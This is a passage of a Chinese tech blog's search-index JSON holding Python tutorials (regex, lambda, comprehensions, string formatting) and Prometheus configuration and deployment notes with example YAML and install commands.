re.finditer(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/', s) # match对象的操作方法，参考re.match print(next(m4).groups()) # sub############################################################################# # 替换字符串，也可以指定替换次数 # res = re.sub(r'http.*?html', \"替换链接\", s) # print(res) # 还可以对匹配到的内容做处理后再进行替换 # 将匹配到的内容传给lambda函数,切割出指定部分在替换 res = re.sub(r'http.*?html', lambda x: \"/\" + x.group().rsplit('/')[-1], s) print(res) # compile####################################################################################### # compile可以实现一个正则多次复用 # 使用指定的表达式生成一个表达式对象 p1 = re.compile(r'(?P\u003curl\u003ehttp.*?)\"\u003e(?P\u003ctitle\u003e.*?)\u003c/') # 使用这个表达式对象来匹配文本。 print(p1.findall(s)) s2 = 'http://soulchild.cn\"\u003e阿就是看到你家\u003c/' print(p1.search(s2).groups()) ","date":"2020-09-13 23:09","objectID":"/post/1984/:0:0","tags":["python"],"title":"python-re模块常用方法","uri":"/post/1984/"},{"categories":["python"],"content":" |________|_________|____________|________|______| { 左边文本 } {右边文本} def get_mid_str(s, start_str, stop_str): # 查找左边文本的结束位置 start_pos = s.find(start_str) if start_pos == -1: return None start_pos += len(start_str) # 查找右边文本的起始位置 stop_pos = s.find(stop_str, start_pos) if stop_pos == -1: return None # 通过切片取出中间的文本 return s[start_pos:stop_pos] txt = r'''\u003ch2 class=\"post-title\" itemprop=\"name headline\"\u003e \u003ca itemtype=\"url\" href=\"https://soulchild.cn/1971.html\"\u003e prometheus-配置文件-rules(三)\u003c/a\u003e\u003c/h2\u003e ''' print(get_mid_str(txt, 'href=\"', '\"\u003e')) ","date":"2020-09-09 17:00","objectID":"/post/1980/:0:0","tags":["python"],"title":"python-取出中间的文本","uri":"/post/1980/"},{"categories":["java"],"content":"https://adoptopenjdk.net/ ","date":"2020-09-09 13:41","objectID":"/post/2758/:0:0","tags":["java"],"title":"adoptopenjdk","uri":"/post/2758/"},{"categories":["python"],"content":"lambda匿名函数: 一般用于将自身做为参数传递给另一个函数 ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:0","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"语法: lambda 参数:返回值 ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:1","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"1.计算一个列表中每个元素的平方 x = list(map(lambda n: n ** 2, [i for i in range(10)])) print(x) [0, 1, 4, 9, 16, 25, 36, 49, 64, 81] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:2","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"2.多个参数的时候 x = list(map(lambda n, z: n ** 2 + z, [i for i in range(10)], [1, 2, 3])) print(x) [1, 3, 7] map参数1指定一个函数，后面的其他参数为可迭代对象。可迭代对象的每个元素会做为参数传递给参数1指定的函数。后面可以指定多个可迭代对象，每个可迭代对象会有个映射关系 上面的函数中range(10)：[0,1,2,3,4,5,6,7,8,9]和[1,2,3]的映射关系就是(0,1),(1,2),(2,3) 分三次执行lambda函数。前面的值就是n，后面的值就是z 相当于0 ** 2 + 1—-\u003e 1 ** 2 + 2 —-\u003e2 ** 2 + 3 可以看下下面这个例子： x = list(map(lambda n, z: (n, z), [\"a\", \"b\", \"c\"], [1, 2, 3])) print(x) [('a', 1), ('b', 2), ('c', 3)] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:3","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"3.按照指定的元素进行列表排序 info = [{\"name\": \"jack\", \"age\": 18}, {\"name\": \"soul\", \"age\": 16}, {\"name\": \"tony\", \"age\": 20}] info.sort(key=lambda x: x['age']) print(info) [{'name': 'soul', 'age': 16}, {'name': 'jack', 'age': 18}, {'name': 'tony', 'age': 20}] ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:4","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"4.列表过过滤 ages = [87, 71, 12, 18, 1, 24, 68, 10] print(list(filter(lambda x: x \u003e 12, ages))) [87, 71, 18, 24, 68] filter参数1指定一个函数，参数2：可迭代对象。可迭代对象的每个元素会做为参数传递给参数1指定的函数，参数1的函数返回值为True时,就保留这个元素，否则会丢弃。 ","date":"2020-09-06 17:37","objectID":"/post/1976/:1:5","tags":["python"],"title":"python-lambda匿名函数","uri":"/post/1976/"},{"categories":["python"],"content":"1.三元表达式: if成立返回左边的值(1)，不成立返回右边的值(0) x = \"\\n\" print(1 if x == \"\\n\" else 0) Out: 1 ","date":"2020-09-05 16:12","objectID":"/post/1974/:1:0","tags":["python"],"title":"python-三元表达式、列表字典集合推导式、生成器表达式","uri":"/post/1974/"},{"categories":["python"],"content":"2.列表推导式 nums = [i for i in range(0, 10)] print(nums) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] nums = [i for i in range(0, 10) if i \u003e 5] print(nums) [6, 7, 8, 9] nums = [(i, k) for i in range(0, 2) for k in range(1, 4)] print(nums) [(0, 1), (0, 2), (0, 3), (1, 1), (1, 2), (1, 3)] ","date":"2020-09-05 16:12","objectID":"/post/1974/:2:0","tags":["python"],"title":"python-三元表达式、列表字典集合推导式、生成器表达式","uri":"/post/1974/"},{"categories":["python"],"content":"3.集合推导式 集合和字典一样,把[]换成{} nums = {i for i in range(0, 10)} print(nums) {0, 1, 2, 3, 4, 5, 6, 7, 8, 9} nums = {i for i in range(0, 10) if i \u003e 5} print(nums) {8, 9, 6, 7} nums = {(i, k) for i in range(0, 2) for k in range(1, 4)} print(nums) {(0, 1), (1, 2), (1, 3), (0, 2), (0, 3), (1, 1)} ","date":"2020-09-05 16:12","objectID":"/post/1974/:3:0","tags":["python"],"title":"python-三元表达式、列表字典集合推导式、生成器表达式","uri":"/post/1974/"},{"categories":["python"],"content":"4.字典推导式 nums = {i + 1: i for i in range(0, 10)} print(nums) {1: 0, 2: 1, 3: 2, 4: 3, 5: 4, 6: 5, 7: 6, 8: 7, 9: 8, 10: 9} nums = {i + 1: i for i in range(0, 10) if i \u003e 5} print(nums) {7: 6, 8: 7, 9: 8, 10: 9} ","date":"2020-09-05 16:12","objectID":"/post/1974/:4:0","tags":["python"],"title":"python-三元表达式、列表字典集合推导式、生成器表达式","uri":"/post/1974/"},{"categories":["python"],"content":"5. 生成器表达式 使用括号表示，结果返回一个生成器对象 nums = (i for i in range(0, 100)) print(nums) \u003cgenerator object \u003cgenexpr\u003e at 0x10a90af68\u003e ","date":"2020-09-05 16:12","objectID":"/post/1974/:5:0","tags":["python"],"title":"python-三元表达式、列表字典集合推导式、生成器表达式","uri":"/post/1974/"},{"categories":["监控"],"content":"Prometheus支持两种可以配置的规则，记录规则和告警规则,然后定期评估.要创建规则需要通过加载文件的方式,通过glogbal中rule_files字段来配置。 检查规则的命令 promtool check rules /path/to/example.rules.yml ","date":"2020-09-02 12:37","objectID":"/post/1971/:0:0","tags":["prometheus"],"title":"prometheus-配置文件-rules(三)","uri":"/post/1971/"},{"categories":["监控"],"content":"一、记录规则 记录规则使您可以预先计算经常需要的或计算代价较高的表达式,并将其结果保存为一组新的时间序列。查询预先计算的结果通常比每次都用原始表达式查询要快得多。这对于仪表板特别有用，仪表板每次刷新时都需要重复查询相同的表达式。 规则都存在于规则组,组内的规则会定期运行。 下面是一个配置示例： groups: # 指定规则组的名称 - name: node_rules # 运行间隔,默认继承全局配置`evaluate_interval` interval: 10s rules: # 新的时间序列命名称 - record: job:http_inprogress_requests:sum # 原始promql expr: sum by (job) (http_inprogress_requests) - record: instance:node_cpu:avg_rate5m expr: 100 - avg(irate(node_cpu_seconds_total{job=~\".*node_exporter\",mode=\"idle\"}[5m])) by (instance) * 100 ** record：新的时间序列名称推荐的命名规范: ** level:metric:operations 第一部分是聚合级别(或者聚合的维度),第二部分是metric指标名称,第三部分是操作 新的指标是可以被复用的： 54041-8f03rjgt46g.png ","date":"2020-09-02 12:37","objectID":"/post/1971/:1:0","tags":["prometheus"],"title":"prometheus-配置文件-rules(三)","uri":"/post/1971/"},{"categories":["监控"],"content":"二、告警规则 警报规则在Prometheus中的配置方式与记录规则相同。 ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:0","tags":["prometheus"],"title":"prometheus-配置文件-rules(三)","uri":"/post/1971/"},{"categories":["监控"],"content":"配置示例: groups: # 规则组名称 - name: example rules: # 告警名称 - alert: load5负载高于5 # 告警规则 expr: node_load5 \u003e 5 # 评估等待时间,可选参数。表示只有当触发条件持续一段时间后才发送告警。在等待期间新产生告警的状态为pending。 for: 10m # 给报警添加标签,可以模板化 labels: severity: critical # 告警描述信息,可以模版化 annotations: summary: load5负载高于5 ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:1","tags":["prometheus"],"title":"prometheus-配置文件-rules(三)","uri":"/post/1971/"},{"categories":["监控"],"content":"模版化 标签和注释值可以使用控制台模板进行模板化。$labels变量保存一个警告实例的标签键/值对。配置的外部标签可以通过$externalLabels变量访问。$value变量保存告警实例的评估值。 示例: groups: - name: example rules: ＃对任何超过5分钟无法访问的实例发出告警 - alert: 实例无法访问 expr: up == 0 for: 5m labels: severity: critical annotations: summary: \"实例 {{ $labels.instance }} 无法访问\" description: \"job{{ $labels.job }}的{{ $labels.instance }}实例已经关闭5分钟以上\" ","date":"2020-09-02 12:37","objectID":"/post/1971/:2:2","tags":["prometheus"],"title":"prometheus-配置文件-rules(三)","uri":"/post/1971/"},{"categories":["监控"],"content":"本篇主要介绍抓取指标相关配置： target: 要抓取的目标\u003chost\u003e:\u003cport\u003e metrics: 指标数据 ","date":"2020-09-01 10:55","objectID":"/post/1965/:0:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"1.static_configs: # 静态配置 static_configs: # 指定要抓取的目标地址 - targets: ['localhost:9090', 'localhost:9191'] # 给抓取出来的所有指标添加指定的标签 labels: my: label your: label ","date":"2020-09-01 10:55","objectID":"/post/1965/:1:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"2.file_sd_configs: 基于文件的自动发现,prometheus会定期读取文件中的配置并重新加载，文件可以是yml、yaml和json格式的。 每个target在执行过程中都有一个元标签__meta_filepath为文件的路径。 # 文件自动发现 file_sd_configs: - files: - foo/*.slow.json - foo/*.slow.yml - single/file.yml # 重新读取文件的间隔,默认5m refresh_interval: 10m - files: - bar/*.yaml json文件的格式： [ { # 配置抓取目标 \"targets\": [ \"http://s1.soulchild.cn\", \"http://s2.soulchild.cn\" ], # 添加标签 \"labels\": { \"env\": \"test\", \"service\": \"app\" } }, { \"targets\": [ \"http://pc.soulchild.cn\" ], \"labels\": { \"env\": \"dev\", \"service\": \"pc\" } }, { \"targets\": [ \"https://soulchild.cn\" ], \"labels\": { \"project\": \"soulchild\", \"env\": \"prod\", \"service\": \"blog\" } } ] yaml文件的格式： - targets: - http://s1.soulchild.cn - http://s2.soulchild.cn labels: env: test service: app - targets: - http://pc.soulchild.cn labels: env: dev service: pc - targets: - https://soulchild.cn labels: project: soulchild env: prod service: blog ","date":"2020-09-01 10:55","objectID":"/post/1965/:2:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"3.relabel_configs: relabel是功能强大的工具，可以在target被抓取之前动态重写目标的标签集。每个scrape可以配置多个relabel,对不同的标签进行不同的操作。relable的过程可以分为：relabel之前,relabel期间,relabel之后。relabel_configs不能操作指标中的标签，只能操作relabel之前的标签。即__开头的和job这些 relabel之前,除了自定义的标签外，还有一些其他的标签： job,这个标签的值是配置文件中job_name配置的值 __address__这个标签的值是要抓取的地址和端口\u003chost\u003e:\u003cport\u003e instance这个标签，在relabel之前是没有的，如果relabel期间也没有设置instance标签,默认情况下instance标签的值就是__address__的内容 __scheme__:http或https __metrics_path__: metrics的路径 __param_\u003cname\u003e: http请求参数,\u003cname\u003e就是参数名 1.以__开头的标签会在relabel完成后，从标签集中删除 2.如果relabel期间需要临时的标签,可以使用__tmp前缀,这个标签不会被prometheus使用，防止冲突 ","date":"2020-09-01 10:55","objectID":"/post/1965/:3:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"relabel可以执行的操作： replace: 将\"target_label\"指定的标签的值替换为\"replacement\"指定的内容 keep: 删除与正则不匹配的目标 drop: 删除与正则匹配的目标 labelmap: 将正则与所有标签的\"名称\"匹配，然后用\"replacement\"指定的内容来替换源标签的名称，source_labels不用填写。一般用来去除标签前缀获得一个新的标签名称 labeldrop: 删除与正则匹配的label,labeldrop只需要写regex字段 labelkeep: 删除与正则不匹配的label,labelkeep只需要写regex字段 hashmod: 这个没看懂 下面可以看一下配置的方法： relabel_configs: # 从现有的标签中指定源标签(可以指定多个),不写source_labels代表所有标签 - source_labels:[__address__, scrape_port] # 多个标签的值会使用以下分割符连接起来,正则的时候需要考虑这个分割符.默认\";\" separator: ; # 使用正则提取数据.假如源标签的内容是\"10.0.0.10:8088;80\",就匹配到10.0.0.10、8088、80这三个部分。默认正则:(.*) regex: (.*?):(\\d+);(\\d+) # 指定要将结果值写入哪个标签。如果写一个不存在的标签，相当于新增一个标签。 target_label: __address__ # 要替换的内容,默认$1 replacement: $1:$3 # 指定要执行什么操作,默认replace action: replace ############################################ # 直接将abc标签的值给cde标签 - source_labels: [abc] # 源标签 target_label: cde # 目标标签 # 将static做为abc标签的值，即abc=static - replacement: static target_label: abc # 同上 - regex: replacement: static target_label: abc ","date":"2020-09-01 10:55","objectID":"/post/1965/:3:1","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"4. metric_relabel_configs: 这个配置的操作是在抓取指标之后,存储数据之前，所以你可以在存储数据之前删除指标、删除和重写指标的标签。 配置的方法和上面的relabel_configs是一样的。 这里会涉及到一个新的预留标签__name__,这个标签的值就是指标名称，所以我们通过修改匹配这个标签就可以对指标进行操作了。 ","date":"2020-09-01 10:55","objectID":"/post/1965/:4:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.下面结合上面说到的做一些配置示例： ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:0","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.1. 这部分包含了大部分的基础配置 # 抓取部分的配置 scrape_configs: # job_name的值默认会做为job标签的值,job_name可以配置多个 - job_name: prometheus # 每个抓取请求上添加\"Authorization\"请求头,下面两个二选一 bearer_token: xxxxxxxxxxxxxxxx bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token # 使用http还是https scheme: http # metrics路径 metrics_path: metrics # 防止prometheus附加的标签、手动配置的标签以及服务发现生成的标签，和抓取数据中的标签冲突. # 默认是false,将抓取的数据中的冲突标签重命名为\"exported_\u003coriginal-label\u003e\".如果设置为true,则保留抓取数据中的标签 honor_labels: true # 当Prometheus联合(联邦)另一个监控系统时，可能是该监控系统暴露了时间戳。对于带有时间戳的联合(联邦)，如果时间戳消失，则Prometheus不会将指标数据标记为\"stale\"状态,相反它将出现在query.loopback值之前https://github.com/prometheus/prometheus/issues/5302 # 默认true,则将使用target公开的指标数据的时间戳.如果设置为\"false\",则target的指标数据的时间戳将被忽略。 honor_timestamps: true # 抓取数据的间隔(不写继承global) scrape_interval: 30s # 抓取数据的超时时间(不写继承global) scrape_timeout: 10s # 存储的数据标签个数限制，如果超过限制，该数据将被忽略，不入存储；默认值为0，表示没有限制 sample_limit: 0 # 文件自动发现配置,target的配置从下面指定的文件中读取 file_sd_configs: - files: - foo/*.slow.json - foo/*.slow.yml - single/file.yml refresh_interval: 10m - files: - bar/*.yaml # target静态配置,从下面指定的目标中抓取数据 static_configs: - targets: ['localhost:9090', 'localhost:9191'] # 添加额外的标签 labels: my: label your: label # 重新标签 relabel_configs: # 整段含义是使用\"(.*)some-[regex]\"匹配源标签中的内容，并将job这个标签的值=foo-${1},$1就是匹配到的内容 - source_labels: [job, __meta_dns_name] regex: (.*)some-[regex] target_label: job replacement: foo-${1} # 直接将abc标签的值给cde标签 - source_labels: [abc] # 源标签 target_label: cde # 目标标签 # 将static做为abc标签的值，即abc=static - replacement: static target_label: abc # 同上 - regex: replacement: static target_label: abc ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:1","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.2 当抓取的http请求需要参数和basic认证时 - job_name: 'param_test' # 如果抓取指标的url需要basic认证则使用下面的方式配置 basic_auth: username: admin_name password: \"multiline\\nmysecret\\ntest\" # 这里指定抓取路径 metrics_path: /probe # 指定http请求参数,相当于http://192.168.0.200:9115/probe?target=https://soulchild.cn\u0026module=http_2xx params: target: [\"https://soulchild.cn\"] module: [http_2xx] # 抓取目标和重新标签。。。。。 static_configs: - targets: [\"192.168.0.200:9115\"] relabel_configs: - source_labels: [__param_target] target_label: instance ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:2","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.3 基于consul自动发现配置 - job_name: service-y consul_sd_configs: - server: 'localhost:1234' token: mysecret services: ['nginx', 'cache', 'mysql'] tags: [\"canary\", \"v1\"] node_meta: rack: \"123\" allow_stale: true scheme: https tls_config: ca_file: valid_ca_file cert_file: valid_cert_file key_file: valid_key_file insecure_skip_verify: false relabel_configs: - source_labels: [__meta_sd_consul_tags] separator: ',' regex: label:([^=]+)=([^,]+) target_label: ${1} replacement: ${2} ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:3","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.4 删除不需要的指标 - job_name: node_exporter static_configs: - targets: ['10.0.0.2:9100'] labels: instance: \"db01\" # 删除node_netstat_Icmp6_InErrors和node_netstat_Icmp6_InMsgs指标 metric_relabel_configs: - source_labels: [__name__] regex: \"(node_netstat_Icmp6_InErrors|node_netstat_Icmp6_InMsgs)\" action: drop ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:4","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.5 替换标签的值 container_id = docker://8bfaa038763215a732dea54ebe8bd8eeb48e2bed88c05f0ec52c00b27214e3c4 将kube_pod_container_info这个指标的container_id标签中id的前8位取出来，并替换至container_id标签 - job_name: kubernetes-service-endpoints kubernetes_sd_configs: - role: endpoints metric_relabel_configs: - source_labels: [__name__, container_id] separator: ; regex: kube_pod_container_info;docker://([a-z0-9]{8}) target_label: container_id replacement: $1 action: replace ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:5","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"5.6 删除不需要的标签 删除kernelVersion这个标签.labeldrop只需要写regex字段 - job_name: kubernetes-cadvisor kubernetes_sd_configs: - role: node bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true metric_relabel_configs: - regex: kernelVersion action: labeldrop ","date":"2020-09-01 10:55","objectID":"/post/1965/:5:6","tags":["prometheus"],"title":"prometheus-配置文件-scrape_configs、relabel_config等抓取相关配置(二)","uri":"/post/1965/"},{"categories":["监控"],"content":"一、global(全局配置) global: # 抓取指标的间隔,默认1m scrape_interval: 15s # 抓取指标的超时时间,默认10s scrape_timeout: 10s # 指定Prometheus评估规则的频率[记录规则(record)和告警规则(alert)],默认1m. # 可以理解为执行规则的时间间隔 evaluation_interval: 30s # 用于区分不同的prometheus external_labels: prometheus: test # PromQL查询记录日志文件。重新加载配置会重新打开文件。 query_log_file: /tmp/query.log ","date":"2020-08-31 17:54","objectID":"/post/1963/:1:0","tags":["prometheus"],"title":"prometheus-配置文件-global、rule_files、remote_read|write(一)","uri":"/post/1963/"},{"categories":["监控"],"content":"二、rule_files(规则配置) 这里介绍一下prometheus支持的两种规则： 记录规则(recording rules):允许预先计算使用频繁且开销大的表达式，并将结果保存为一个新的时间序列数据，然后查询的时候就不会耗费太多的系统资源和加快查询速度。 警报规则(alerting rules): 这个就是自定义告警规则的 # 加载指定的规则文件 rule_files: - \"first.rules\" - \"my/*.rules\" ","date":"2020-08-31 17:54","objectID":"/post/1963/:2:0","tags":["prometheus"],"title":"prometheus-配置文件-global、rule_files、remote_read|write(一)","uri":"/post/1963/"},{"categories":["监控"],"content":"三、remote_read、remote_write（远程读写配置） remote_write: # 指定写入数据的url - url: http://remote1/push # 远程写配置的名称，如果指定，则在远程写配置中必须是唯一的。该名称将用于度量标准和日志记录中，代替生成的值，以帮助用户区分远程写入配置。 name: drop_expensive # 远程写重新打标签配置 write_relabel_configs: - source_labels: [__name__] regex: expensive.* action: drop # 指定写入数据的第二个url - url: http://remote2/push name: rw_tls # tls连接配置 tls_config: cert_file: valid_cert_file key_file: valid_key_file remote_read: # 指定读取数据的url - url: http://remote1/read # 表示近期数据也要从远程存储读取，因为Prometheus近期数据无论如何都是要读本地存储的。设置为true时，Prometheus会把本地和远程的数据进行Merge。默认是false，即从本地缓存查询近期数据. read_recent: true name: default # 指定读取数据的第二个url - url: http://remote3/read # 从本地缓存查询近期数据 read_recent: false name: read_special # 可选的匹配器列表，必须存在于选择器中以查询远程读取端点。 required_matchers: job: special tls_config: cert_file: valid_cert_file key_file: valid_key_file ","date":"2020-08-31 17:54","objectID":"/post/1963/:3:0","tags":["prometheus"],"title":"prometheus-配置文件-global、rule_files、remote_read|write(一)","uri":"/post/1963/"},{"categories":["监控"],"content":"1.解压 wget https://github.com/prometheus/prometheus/releases/download/v2.15.0/prometheus-2.15.0.linux-amd64.tar.gz tar xf prometheus-2.15.0.linux-amd64.tar.gz mv prometheus-2.15.0.linux-amd64/prometheus /usr/local/bin mv prometheus-2.15.0.linux-amd64/promtool /usr/local/bin ","date":"2020-08-31 16:26","objectID":"/post/1962/:0:1","tags":["prometheus"],"title":"prometheus-二进制部署","uri":"/post/1962/"},{"categories":["监控"],"content":"2.启动 mkdir -p /etc/prometheus cp prometheus-2.15.0.linux-amd64/prometheus.yml /etc/prometheus prometheus --config.file=\"/etc/prometheus/prometheus.yml\" 参数说明： # 指定配置文件 --config.file=\"/etc/prometheus/prometheus.yml\" # 监听地址和端口 --web.listen-address=\"0.0.0.0:9090\" # 如果使用反向代理访问prometheus的话，这里配置反向代理的地址 --web.external-url=\"http://xxx.com\" # 开启后可以使用http请求的方式来动态重新加载配置文件 --web.enable-lifecycle # 开启后可以使用api来管理prometheus数据 --web.enable-admin-api # 下面两个选项可以添加prometheus控制台自定义模板页面 --web.console.templates=\"consoles\" --web.console.libraries=\"console_libraries\" # 指定指标数据的存储路径 --storage.tsdb.path=\"data/\" # 数据保留时间(y, w, d, h, m, s, ms) --storage.tsdb.retention=7d # 最多能使用的磁盘空间大小(KB, MB, GB, TB, PB) --storage.tsdb.retention.size=1GB # 不创建锁文件，在k8s中以deployment运行的时候，可以加上这个参数，防止异常退出无法启动 --storage.tsdb.no-lockfile # 压缩wal文件 --storage.tsdb.wal-compression # 关闭或重新加载prometheus配置时等待刷写数据的时间 --storage.remote.flush-deadline= # 日志级别(debug, info, warn, error) --log.level=info # 日志格式(logfmt, json) --log.format=logfmt ","date":"2020-08-31 16:26","objectID":"/post/1962/:0:2","tags":["prometheus"],"title":"prometheus-二进制部署","uri":"/post/1962/"},{"categories":["监控"],"content":"本文内容来自图书prometheus监控实战 ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:0","tags":["prometheus"],"title":"prometheus-指标类型","uri":"/post/1958/"},{"categories":["监控"],"content":"1.测量型(gauge): 第一种指标类型是测量型（gauge），这种类型是上下增减的数字。常见的监控指标如CPU、内存和磁盘使用率等都属于这个类型。对于业务指标来说，可能是网站上的客户数量。 83770-cic2e05xkvt.png ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:1","tags":["prometheus"],"title":"prometheus-指标类型","uri":"/post/1958/"},{"categories":["监控"],"content":"2.计数型(counter): 第二种类型是计数型（counter），这种类型是随着时间增加而不会减少的数字。虽然它们永远不会减少，但有时可以将其重置为零并再次开始递增。应用程序和基础设施的计数型示例包括系统正常运行时间、设备收发包的字节数或登录次数。业务方的示例可能是一个月内的销售数量或应用程序收到的订单数量。 计数型指标的一个优势在于它们可以让你计算变化率。每个观察到的数值都是在一个时刻：t，你可以使用t+1处的值减去t处的值，以获得两个值之间的变化率。通过了解两个值之间的变化率，可以理解许多有用的信息。例如登录次数指标，你可以通过计算变化率来查看每秒的登录次数，这有助于确定网站这段时间的受欢迎程度。 17129-omzxiiojryk.png ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:2","tags":["prometheus"],"title":"prometheus-指标类型","uri":"/post/1958/"},{"categories":["监控"],"content":"3.直方图(histogram): 直方图（histogram）是对观察点进行采样的指标类型，可以展现数据集的频率分布。将数据分组在一起并以这样的方式显示，这个被称为\"装箱\"（binning）的过程可以直观地查看数值的相对大小。 统计每个观察点并将其放入不同的桶中，这样可以产生多个指标：每个桶一个，加上所有值的总和以 及计数。 通常，频率分布直方图看起来像条形图 30274-jp73q0choei.png 上图是身高频率分布的样本直方图。x轴是身高的分布，y轴是对应的频率值，例如可以看到身高 160～165cm对应的值是2。 ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:3","tags":["prometheus"],"title":"prometheus-指标类型","uri":"/post/1958/"},{"categories":["监控"],"content":"4.摘要型(Summary): 摘要型(Summary)类似于直方图，摘要会采样观察结果（通常是请求持续时间和响应大小之类的东西）。尽管它还提供了观测值的总数和所有观测值的总和，但它可以计算滑动时间窗口内的可配置分位数。 ","date":"2020-08-31 13:53","objectID":"/post/1958/:0:4","tags":["prometheus"],"title":"prometheus-指标类型","uri":"/post/1958/"},{"categories":["python"],"content":"方式一： %格式化 常用的一些： %s: 字符串 %10s:使用空格在左边补齐10个字符 %-10s:使用空格在右边补齐10个字符 %.3s:只保留前3个字符 %d: 整数 %3d:使用空格在左边补齐10位数 %-3d:使用空格在右边补齐10位数 %03d:使用0补齐3位数。比如5补齐后就是005 %f: 浮点数 %.2f:小数点后保留2位（四舍五入） %6.2f:在数值前面用空格补齐6位数，小数点后保留2位（四舍五入） %-6.2f:在数值后面用空格补齐6位数，小数点后保留2位（四舍五入） ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:0","tags":["python"],"title":"python-字符串格式化","uri":"/post/1956/"},{"categories":["python"],"content":"1.直接使用 # 直接百分号使用 '你好啊，我是%s,今天是%d月%d日' % ('soulchild',8,31) # 添加别名 '你好啊，我是%(name)s,今天是%(month)d月%(day)d日' % {'name':'soulchild','month':8,'day':31} ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:1","tags":["python"],"title":"python-字符串格式化","uri":"/post/1956/"},{"categories":["python"],"content":"2.填充补齐 # %-10s：表示使用空格在右边补齐10个字符 s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%-10s%d' %(k,i)) # 结果： python 0 java 1 golang 2 ruby 3 erlang 4 php 5 ########################################################## # %10s：表示使用空格在左边补齐10个字符 s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%10s%d' %(k,i)) # 结果： python0 java1 golang2 ruby3 erlang4 php5 ########################################################## # %05d：表示使用0在前面补齐5位数 s=['python', 'java', 'golang', 'ruby', 'erlang', 'php'] for i,k in enumerate(s): print('%-10s%05d' %(k,i)) # 结果： python 00000 java 00001 golang 00002 ruby 00003 erlang 00004 php 00005 ","date":"2020-08-31 08:48","objectID":"/post/1956/:1:2","tags":["python"],"title":"python-字符串格式化","uri":"/post/1956/"},{"categories":["python"],"content":"方式二：format格式化 使用{}占位 格式： {}:———-按照顺序填充 {索引}: ———-按指定位置填充 {name}: ———-按照名称或字典key {:b}{:d}{:o}{:x}{.3f}: ———-b:二进制、d:十进制 o:8八进制 x:十六进制 .3f:保留3位小数(四舍五入) {:,}: ———-千位分隔符的方式显示数值。例如:100,000 {:0\u003e4.1f}: ———-0\u003e:使用0左边填充,可以自定义填充符。4:总长度。.1f:保留1位小数(四舍五入) \u003c，在右边填充 \u003e，在左边填充 ^，在两边填充 {!r}: ———-!r:不使用转意符，相当于r’abc\\ndef' # 按顺序填充 print('你好啊，我是{},今天是{}月{}日'.format('soulchild',8,31)) # 你好啊，我是soulchild,今天是8月31日 # 按指定位置填充 print('你好啊，我是{1},今天是{0}月{2}日,{2}日是星期一'.format(8,'soulchild','31')) # 你好啊，我是soulchild,今天是8月31日,31日是星期一 # 按照名称填充 print('你好啊，我是{name},今天是{month}月{day}日'.format(name='soulchild',month=8,day=31)) # 你好啊，我是soulchild,今天是8月31日 # 通过字典的方式填充 info = {'name': 'soulchild', 'month': 8, 'day': 31} print('你好啊，我是{name},今天是{month}月{day}日'.format(**info)) # 你好啊，我是soulchild,今天是8月31日 # 千位分隔符的方式显示数值 print('我有多少钱？你去数吧：{:,}'.format(100000123120000)) 我有多少钱？你去数吧：100,000,123,120,000 